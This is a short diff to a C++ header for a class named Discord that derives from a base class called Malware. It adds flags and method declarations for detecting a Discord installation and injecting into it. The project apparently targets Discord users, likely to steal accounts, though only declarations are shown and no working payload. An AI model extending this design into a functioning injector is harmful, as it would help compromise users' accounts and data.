@@ -14,11 +14,14 @@
 class Discord : public Malware 
 {
     private:
-        bool isDone{ false };
+        bool DiscordInstalled{ false };
+        bool InjectionWrited{ false };
 
     public:
         bool checkDiscord();
-        bool isDiscordDone();
+        bool injectDiscord();
+        bool isInjectionWrited();
+        bool isDiscordInstalled();
 };
 
 #endif
